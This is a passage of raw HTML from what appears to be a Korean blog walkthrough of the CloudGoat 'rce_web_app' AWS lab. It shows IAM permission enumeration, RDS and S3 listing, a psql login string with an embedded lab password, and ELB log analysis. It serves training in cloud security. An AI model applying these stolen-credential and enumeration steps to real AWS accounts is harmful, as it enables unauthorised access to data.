style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 47.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAABeklEQVQoz5WRW2/aQBCFF0gKAWODqcH39RWM7XBNglopUv//n/qq2QgprdqHPBzN6szumTln1f74QnO4IrU73SiqM6fLO93zD9r+xvX1F/vuDZ33JLojjBuDKNmTV0eCqMFexKy8nNHjEtWeXsi3HYEuCXVNmOzxwy0LV2PZEc4ywV7luOuS5UqzcFPDz50Y93tm6ujRNRg+LFHH8ztZcSTNerL8QKJbUt3RH35Sbs8U1YlAXxhPNig1Rw1s1NBBDRyUsk0VoTtUut0R5AVxVROXO/ykp25vxGnL1Ap4snysicdYLt/F/obw9153uZI3e8KiNLY9fSGuX4mSxlgX0ZkdMrMjk5XYFU7qbB4wm4fGtuDbxEOV9dmE7G0q1n5NEO3MdsJJ4BK+nEVcYhGs/cp80CbY4ocf94WXgapp38yDrDjgevlHTp9t/BP/6cs7CV2myaY6f2blFQxHiz+C/gqU/GqQ1oytFU+2x9TxGTsZUydh9LBk8EXx32lv4PK8WUwuAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/122d1f25bdbd44783c13742c69b40f4a/37523/8.png\"\n        srcset=\"/static/122d1f25bdbd44783c13742c69b40f4a/e9ff0/8.png 180w,\n/static/122d1f25bdbd44783c13742c69b40f4a/f21e7/8.png 360w,\n/static/122d1f25bdbd44783c13742c69b40f4a/37523/8.png 720w,\n/static/122d1f25bdbd44783c13742c69b40f4a/58213/8.png 902w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>EC2 인스턴스에는 S3 Bucket에서 객체를 다운로드 할 수 있는 권한이 <code class=\"language-text\">cg-secret-s3-bucket-rce-web-app-cgid7ge6zuhcu1</code> 에 있습니다..</li>\n<li>다운로드한 파일에는 데이터베이스 Credential 이 있지만 해당 정보를 가지고 어디에서 사용할지를 모릅니다.</li>\n</ul>\n<h3 id=\"rds-instance-나열-및-postgresql-접속\" style=\"position:relative;\"><a href=\"#rds-instance-%EB%82%98%EC%97%B4-%EB%B0%8F-postgresql-%EC%A0%91%EC%86%8D\" aria-label=\"rds instance 나열 및 postgresql 접속 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>RDS Instance 나열 및 PostgreSQL 접속</h3>\n<ul>\n<li>IAM 사용자 McDuck은 AWS 계정의 RDS 인스턴스를 나열한 권한이 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws rds describe<span class=\"token operator\">-</span>db<span class=\"token operator\">-</span>instance <span class=\"token operator\">-</span><span class=\"token operator\">-</span>region us<span class=\"token operator\">-</span>east<span class=\"token operator\">-</span><span class=\"token number\">1</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 60%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAABnklEQVQoz31T127CQBA8ejHGuNsYYzqmJ6Ik8BKF/P83TTQrQwgCHlZ767vbm7JWxbKNMJoijFIYZgzW+aKJQsmSYF2qONfMKFed7JuFXKEl55lLFRuKhVIa/HCM9+0XlusTVpsT4mSBpL9CpzuH5fTQshLY7gCW04frj+B4QzSa0bOGDbQ7KXaHb2k2ne2lGaNS82RfKT3Lt6FD5Q2oXFNCGl7ouMFIGvYGa0EXxXM0WzF0I4JhdmHaPUFHlKyJmmueYa3pbZFC6UZHNgjf8QbwgpFcrDdCmHYijeqNAOWqi2rdl+CayP/WbqavDSWQlS6Xur0lJukO/eEmQ9MXrWqaLywYcv5JSEM6Sf50+vD5g/3HGbvDGel8j8H47aolHyA9av4o7kzRxWU2XKyPWK6PCNoTocEH5Uwm/K2rDxteNlTOkMtRPBPHaQz1pLbMF30pPum9RMiipgVymbSYNT0UzW6RXNA+Qvmfct4QV0l7PN0iXRwEIWnz7+Egc7DpOB+6p/uQMjMRcFRcfwi/PYEXjAUtx4pUOSrU9ZWGv4nOH71U8ySPAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/264f0935ad801f8ffdc18347f282b0e9/37523/9.png\"\n        srcset=\"/static/264f0935ad801f8ffdc18347f282b0e9/e9ff0/9.png 180w,\n/static/264f0935ad801f8ffdc18347f282b0e9/f21e7/9.png 360w,\n/static/264f0935ad801f8ffdc18347f282b0e9/37523/9.png 720w,\n/static/264f0935ad801f8ffdc18347f282b0e9/dc616/9.png 933w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>AWS 계정에 <code class=\"language-text\">Postgress</code> 을 사용하는 RDS 인스턴스가 있지만 Public으로 접근이 불가능 합니다.</li>\n<li>인스턴스 설명에서 EC2 인스턴스와 RDS 인스턴스가 동일한 VPC에 있었기 때문에  EC2가 터미널을 사용하여 연결할 수있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token string\">\"DBInstances\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token string\">\"DBInstanceIdentifier\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cg-rds-instance-rce-web-app-cgid7ge6zuhcu1\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"DBInstanceClass\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"db.t2.micro\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Engine\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"postgres\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"DBInstanceStatus\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"available\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"MasterUsername\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cgadmin\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"DBName\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cloudgoat\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Endpoint\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token string\">\"Address\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"cg-rds-instance-rce-web-app-cgid7ge6zuhcu1.cklw91kahwum.us-east-1.rds.amazonaws.com\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"Port\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">5432</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"HostedZoneId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Z2R2ITUGPM61AM\"</span>\n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"AllocatedStorage\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"InstanceCreateTime\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2021-08-14T04:55:48.745Z\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"PreferredBackupWindow\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"09:34-10:04\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"BackupRetentionPeriod\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"DBSecurityGroups\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"VpcSecurityGroups\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token string\">\"VpcSecurityGroupId\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"sg-0a6dd31c217ba1c3b\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">\"Status\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"active\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></code></pre></div>\n<ul>\n<li><code class=\"language-text\">DBInstance</code> 에서 추려할 데이터는 <code class=\"language-text\">Endpoint</code> 값에서 Address 부분이다. 해당 주소는 rds의 인스턴스 id로 ssh상에서 postgresql에 접속할때 필요한 부분이다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">psql postgresql<span class=\"token punctuation\">:</span><span class=\"token operator\">//</span>cgadmin<span class=\"token punctuation\">:</span>Purplepwny2029@cg<span class=\"token operator\">-</span>rds<span class=\"token operator\">-</span>instance<span class=\"token operator\">-</span>rce<span class=\"token operator\">-</span>web<span class=\"token operator\">-</span>app<span class=\"token operator\">-</span>cgid7ge6zuhcu1<span class=\"token punctuation\">.</span>cklw91kahwum<span class=\"token punctuation\">.</span>us<span class=\"token operator\">-</span>east<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">.</span>rds<span class=\"token punctuation\">.</span>amazonaws<span class=\"token punctuation\">.</span>com<span class=\"token punctuation\">:</span><span class=\"token number\">5432</span><span class=\"token operator\">/</span>cloudgoat\n\npsql postgresql<span class=\"token punctuation\">:</span><span class=\"token operator\">//</span>cgadmin<span class=\"token punctuation\">:</span>Purplepwny2029@<span class=\"token punctuation\">[</span>rds_instance<span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span><span class=\"token number\">5432</span><span class=\"token operator\">/</span>cloudgoat\n</code></pre></div>\n<ul>\n<li><code class=\"language-text\">psql</code> 클라이언트를 사용하여 RDS에 연결하고 성공적으로 로그인이 된 것을 확인할 수 있습니다.</li>\n<li>PostgreqSQL 명령을 통해 테이블 을 조회하고 해당 테이블의 구성 내용들을 확인해 보았습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 28.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAy0lEQVQY042Q2RKCMAxFiyuiQEspZRMQRBxRn/X/P+w6yahvLg+ZNun05CRCmx2UrrH2c0xmCtN5hIVrMFtoCOFDTEIIJ4Azlfz+Oj+FqJozZFQxkO55eYTNDsiKgetKN9Cm/Ql6A8fLHXHScaTFwDBjO4bYrGcwNSLzf6AiSfunSQ3XswhkybkfllxTcYPlKuGxXyN/A4s0P6Bpr2xh7B6UkxXFeLmhrE68Bm+T8T5/GhIsVBU2QcFG9JHsArllUxnViJMWq3X6F/ABunCN2gPea70AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/838adc98eddf2cf3705df019fa9da748/37523/10.png\"\n        srcset=\"/static/838adc98eddf2cf3705df019fa9da748/e9ff0/10.png 180w,\n/static/838adc98eddf2cf3705df019fa9da748/f21e7/10.png 360w,\n/static/838adc98eddf2cf3705df019fa9da748/37523/10.png 720w,\n/static/838adc98eddf2cf3705df019fa9da748/cc155/10.png 886w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"lara-iam-user-허용가능한-정책-분석\" style=\"position:relative;\"><a href=\"#lara-iam-user-%ED%97%88%EC%9A%A9%EA%B0%80%EB%8A%A5%ED%95%9C-%EC%A0%95%EC%B1%85-%EB%B6%84%EC%84%9D\" aria-label=\"lara iam user 허용가능한 정책 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lara IAM User 허용가능한 정책 분석</h3>\n<ul>\n<li>Lara 역시 mcduck과 마찬가지로 IAM 사용자인 Lara의 AWS Credentail로 사용하 수 있는 권한에 대해 열거를 해보았습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 52.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACC0lEQVQoz2VSaY+aYBBmt4eurSAKuFXx4EaUG1lRPNaaNDX90P7///I0M2xNmv0wmTeZyXPNK2R5DcdN4HgJ4ngLN6pg7W7I8j2y4oA4rRCsNwjjHaIsxunm4Porwp/0gt/WBQezgh0UCNZbjHUfguVm8IMSk+kSkjyFKE0giSN0ezpkZQ5R1rkGqoGuRHMDkmziS1+HqM3RHxqQBzPIgzm60hhCWV1xON9Qbr+zCtNO4AUbeMsCrl9gboTMbtoxv7PNEbabQlEX0DQTimqgryzwVRxDeBAhRGmNOD0gSvZYhRUWZgTHy7nitGaSdVQxKFe45dl0vsJI95lEnwWYmyG6vQkEx8/Z+/CbDXVosjVFM6A9W3geORB7OhTNxGji8Zz2aN7uDPG5raLV0dB6UtHuaPjUUiAU5Svq409QT/MTlqsS62jHFcZ7TGYB8s0ZWXFixXn5yk7IEeUmCCIePvQgPEpN/7dEnewYVgz3LT/qpKwoLxwLEdDeOm7IKGsCevwo30sgRVFS86VtL8PMCPkwlpvCdjOoQ4uz81clvGVzLM7Yzznvd4BkdVf/QFacWQUpW4XNAcgahf9SXdkyEVNP8yMLIBICIat3wOhuubm05aR3u6SG/mfxNqciMgKlKHr9GVpP2v+AlAN9C+rEODPWWFgRZ0nW6drL1UtD4jffyXQS3u2ri3eAfwHZ9T0U51OxRAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/7d764bb99c0a6bf3ed2fa509b25e3ac6/37523/11.png\"\n        srcset=\"/static/7d764bb99c0a6bf3ed2fa509b25e3ac6/e9ff0/11.png 180w,\n/static/7d764bb99c0a6bf3ed2fa509b25e3ac6/f21e7/11.png 360w,\n/static/7d764bb99c0a6bf3ed2fa509b25e3ac6/37523/11.png 720w,\n/static/7d764bb99c0a6bf3ed2fa509b25e3ac6/fcbaf/11.png 895w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>IAM 사용자 Lara는 일부 EC2, RD3, S3 권한이 있는 것을 확인할 수 있습니다. 똑같이 AWS 계정에 S3 bucket들을 나열해 보겠습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 18.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAABB0lEQVQY0zWPbU+CYABFH19SNgdIaiqCIA8D14h0hq8L1GEtda1a6w/Ul35Av/80bX04u/ds98sVkyTlbpoxSTLmiy2z1Q5nsiWK5xiXNqrWRav30A0Lvd7DknWcUKVlNihXmhTLBhWlRUVpclFtIuaLDdK/wQ9ifD/CC8coUUbPDug7IV1T4nrX503fHZJsdGa5Shi3qSodytUGRsOhpproho3w/DFtM2QgR1x1Q9xBjDTl2S0nwpUjXO8WZxATDBPMzpKC8BFCQxQ1CiUDUTh1/Y/94ZX7NOeUu3zP7viO9fxJun4kzXKWqw35w4HD8Y2n/QtfPwEf3wbTdYdazUaU9PPtf34BO8VxhlAnJCIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/427a3b80f7237304d8ec58cd441ddbf4/37523/12.png\"\n        srcset=\"/static/427a3b80f7237304d8ec58cd441ddbf4/e9ff0/12.png 180w,\n/static/427a3b80f7237304d8ec58cd441ddbf4/f21e7/12.png 360w,\n/static/427a3b80f7237304d8ec58cd441ddbf4/37523/12.png 720w,\n/static/427a3b80f7237304d8ec58cd441ddbf4/1cfc2/12.png 900w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>AWS 계정에는 3개의 Cloud Goat 관련된 Bucket들이 존재하고 S3 bucket의 콘텐츠를 다운로드하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABcElEQVQY02WLS4+aYABFaZxx0WkRwTqZ6IiP0ZQZEPABH1jk6QM10Vk0nV27bbrusr/9NNJlFyc39+Zc6f5hgtoa8LHRRVF17uQOmtJFUbo0VL3aG80ecrP3z5PH1GpdJEnmXU35D2lXvpKkJV/WW7blhTTe4pRvuMmJJN7iBylZfmSzPXM4vfL1x5xw16bTv+e23uamrnJT1ypqtyrS4Xjhym5/Yn84czmdMd5+4R6/cdjsEWFMXpTsyzO7suTnn0e+/75DxAPkRh+1paN9GtBqj5CVLtKzKbgyGs94mswwTIH14mFNA6ZOhDkNcWZrbDfi2QwwPq+ZjFeYVsTwyabzaKAPLXp9k6amIznzNUs/qw7zZYJ77V6KCDZ4ImcV7av0gwIvKFiEGS/zEMdLsGcRlr1iKfLK0QcWkjuPWPopIizwRIYQKU50wPZzprZg4SX4QcbCTxBBTmbEHM2CyAxxnYD+yKap9Wm1h7z/8MBfy+24wh/7zXUAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/f8e3cecc08e14ac34a443dcdd67ed0aa/37523/13.png\"\n        srcset=\"/static/f8e3cecc08e14ac34a443dcdd67ed0aa/e9ff0/13.png 180w,\n/static/f8e3cecc08e14ac34a443dcdd67ed0aa/f21e7/13.png 360w,\n/static/f8e3cecc08e14ac34a443dcdd67ed0aa/37523/13.png 720w,\n/static/f8e3cecc08e14ac34a443dcdd67ed0aa/6c745/13.png 893w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>IAM 사용자 Lara는 <code class=\"language-text\">cg-logs-s3-bucket-rce-web-app-cgid7ge6zuhcu1</code> S3 bucket을 다운 받았으며 해당 파일은 Elastic Load Balancer(ELF) 서비스용 AWS log처럼 확인할 수있다.</li>\n</ul>\n<h3 id=\"elb-로그-수집-및-분석\" style=\"position:relative;\"><a href=\"#elb-%EB%A1%9C%EA%B7%B8-%EC%88%98%EC%A7%91-%EB%B0%8F-%EB%B6%84%EC%84%9D\" aria-label=\"elb 로그 수집 및 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ELB 로그 수집 및 분석</h3>\n<p><strong>Elastic Load Balancing(ELB)</strong></p>\n<ul>\n<li>AWS 배포를 위한 Load Balancer Service이며 ELB는 들어오는 애플리케이션 트래픽을 자동으로 분석하고 트래픽 수요를 충족하도록 리소를 확장할 수 있습니다.</li>\n<li>애플리케이션 트래픽인 AWS EC2 인스턴스, 컨테이너, IP address, Lambda 함수 등 여러 애플리케이션를 대상으로 자동 분산을 진행합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 17.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAzklEQVQI1x3MXU+CYABAYa5EBAG3FHixAlIUkBEKCPgVNufW1uq2+/7/XzgtLp6rsx2pu36wK44sVxnxpmQT50yzC3bSsFqmhKtX5o8htgiwbB/HCTjLaz4nFbuBwDKmDJQZI9VGVmZIaXZAzKPeOtnzEm4J/JQoKgkWOUna4C9yVN3FmDyhjgWy4SCbgqHpomgCdeyg6YLhyEKq6jfK/aVXt1dOx3fi7puovVMWB/57vm05nG4U1Zm66fiJ7vymX9yeczzHw3zw0HS3H/4Bdr1W8Kcr5XcAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/7b411b6be1c3fcd79fef75257e490ce1/37523/14.png\"\n        srcset=\"/static/7b411b6be1c3fcd79fef75257e490ce1/e9ff0/14.png 180w,\n/static/7b411b6be1c3fcd79fef75257e490ce1/f21e7/14.png 360w,\n/static/7b411b6be1c3fcd79fef75257e490ce1/37523/14.png 720w,\n/static/7b411b6be1c3fcd79fef75257e490ce1/83e77/14.png 889w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>ELB 로그 분석을 진행하기 위해서 <code class=\"language-text\">elb-log-analyzer</code> 도구를 이용하였습니다. 해당 도구는 NodeJs기반으로 동작하며 웹 애플리케이션 상에서 동작한 모든 URL에 대한 카운팅을 해줍니다.</li>\n</ul>\n<p><a href=\"https://www.npmjs.com/package/elb-log-analyzer\">elb-log-analyzer</a></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 45.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAAB6klEQVQozz2P607bQBCFDUUFSsjFt3i93vVm49i5k4YiShIokDaRWiSkqn2A/un7v8FXeYP640i7c2a+M+NNZ7dsHnbcrbc8bX/w+LjneveT5faV9fqZ9f03Pq+eeHr+zubLnsf7PX+Wr/y9/c22vGbQn5CqEbZY0GimePPFiq+7V1brHevNntXdlo8PL8xXe5bLDT07JzdTjJkiZIlMSm6iK27iBUXHkHQtbd+QpCXnFwle4BtkWqCrClWU9MYjqvmEYjzCjEb0p2PycogalPgiI8wULS2dQpPT6qY0gwTvqIl33MILQo3vpwhrSPs9VNXHTAaoYUE2sNhZ6Tzn2x5mXGJGdXCJrgqiTBPrHD/JeH8e4oUipx1KGn5CMxC0wpQgVbSi1KnTlTQ6yUHthEtfHBQI59U9NawGn11EeLE0BHH2f7iG1WYotTux/rdj6eSG65rI3s7X7h1K5bZ0wCDWNDvCbVinHhJrQOpUp9f1y9r3E+dfxoJGJOiI7NDzBj29CPGULUmVJRCaSOZ0laHbK4hyS6KN+weJIhQaP1HEMkclBi0sUmrCVDlYpDSn9Ya9/oTJ7BO2P2FQXTEcTAlna9rlDdZUKF0hUktuhkg9wGYVLx8W/AruWJ4ldEPJyWnI8UmHo3dt/gGsyvWuoEzP+wAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/1cb2f784e3950d5e7c82e8027abb0b12/37523/15.png\"\n        srcset=\"/static/1cb2f784e3950d5e7c82e8027abb0b12/e9ff0/15.png 180w,\n/static/1cb2f784e3950d5e7c82e8027abb0b12/f21e7/15.png 360w,\n/static/1cb2f784e3950d5e7c82e8027abb0b12/37523/15.png 720w,\n/static/1cb2f784e3950d5e7c82e8027abb0b12/59822/15.png 916w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>로그 파일의 URL Access 정보들을 확인할 수 있습니다. 해당 URL로 이동을 해보면 오류가 발생하는데 실제로 실행중인 로드 밸랜서가 있는지 확인을 했습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws elbv2 describe<span class=\"token operator\">-</span>load<span class=\"token operator\">-</span>balancers <span class=\"token operator\">-</span><span class=\"token operator\">-</span>profile lara</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 75%; position: relative; bottom: 0; left: 0; background-image: 